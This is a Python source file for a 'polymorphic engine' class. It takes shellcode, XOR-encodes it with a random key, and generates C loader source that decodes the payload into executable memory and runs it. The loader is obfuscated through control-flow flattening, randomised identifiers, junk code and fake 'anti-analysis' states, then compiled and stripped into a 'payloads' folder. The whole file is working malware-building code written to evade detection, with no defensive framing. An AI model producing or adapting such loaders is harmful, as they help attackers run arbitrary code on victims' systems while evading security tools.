import os
import random
import string
import subprocess
import hashlib
from typing import Tuple

class PolymorphicFactory:
    """
    Sprint 16: Advanced Polymorphic Engine.
    Implements 'Source-Based Control Flow Flattening' to simulate OLLVM behavior.
    """
    
    def __init__(self):
        self.output_dir = "targets/payloads"
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

    def _random_string(self, length=8) -> str:
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))

    def _xor_encode(self, data: bytes) -> Tuple[str, int]:
        key = random.randint(1, 255)
        encoded = [b ^ key for b in data]
        c_array = "{ " + ", ".join([f"0x{b:02x}" for b in encoded]) + " }"
        return c_array, key

    def generate_flattened_loader(self, shellcode: bytes, output_name="loader") -> str:
        """
        MASTERPIECE LOGIC: Control Flow Flattening.
        Instead of running A -> B -> C, we create a 'Dispatcher' loop.
        state = A
        while(1):
           switch(state):
             case A: do_work; state = B; break;
             case B: do_work; state = C; break;
        """
        print(f"[POLY] Generating FLATTENED loader for {len(shellcode)} bytes...")
        
        c_payload, key = self._xor_encode(shellcode)
        
        # Randomize Variable Names
        var_state = self._random_string(5)
        var_payload = self._random_string(6)
        var_key = self._random_string(4)
        var_counter = self._random_string(3)
        var_exec = self._random_string(5)
        
        # Randomize State Values (The Maze)
        states = list(range(1, 6))
        random.shuffle(states)
        s_start, s_alloc, s_decrypt, s_exec, s_end = states

        # Construct the C Source with a Dispatcher (Flattening)
        c_source = f"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

int main() {{
    unsigned char {var_payload}[] = {c_payload};
    unsigned char {var_key} = {key};
    void *{var_exec} = 0;
    int {var_counter} = 0;
    
    // CONTROL FLOW FLATTENING DISPATCHER
    int {var_state} = {s_start};
    
    while({var_state} != {s_end}) {{
        // Dead Code Injection (Junk Math)
        volatile int junk = {random.randint(1,99)}; junk++;
        
        switch({var_state}) {{
            case {s_start}:
                // State 1: Initialization (Mental NOP)
                {var_state} = {s_alloc};
                break;
                
            case {s_alloc}:
                // State 2: Allocation
                {var_exec} = mmap(0, sizeof({var_payload}), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
                {var_state} = {s_decrypt};
                break;
                
            case {s_decrypt}:
                // State 3: Decryption Loop
                for ({var_counter} = 0; {var_counter} < sizeof({var_payload}); {var_counter}++) {{
                    ((unsigned char*){var_exec})[{var_counter}] = {var_payload}[{var_counter}] ^ {var_key};
                }}
                {var_state} = {s_exec};
                break;
                
            case {s_exec}:
                // State 4: Execution
                ((void (*)()){var_exec})();
                {var_state} = {s_end};
                break;
                
            default:
                // Anti-Analysis: Fake states
                junk = junk * 2;
                break;
        }}
    }}
    return 0;
}}
"""
        # Save and Compile
        src_path = os.path.join(self.output_dir, f"{output_name}.c")
        bin_path = os.path.join(self.output_dir, f"{output_name}.bin")
        
        with open(src_path, "w") as f:
            f.write(c_source)
            
        # 4. Compile (Using gcc)
        # FIXED: Removed shell=True to prevent Command Injection (Bandit B602)
        try:
            cmd = [
                "gcc",
                src_path,
                "-o", bin_path,
                "-O0",      # No optimization (preserve flattening)
                "-s",       # Strip symbols
                "-no-pie"   # Disable PIE
            ]
            
            # shell=False is the default, but we are explicit for safety
            subprocess.check_output(cmd, shell=False)
            
            print(f"[POLY] Compilation success: {bin_path}")
            return bin_path
        except subprocess.CalledProcessError as e:
            print(f"[POLY] Compilation Failed: {e}")
            return None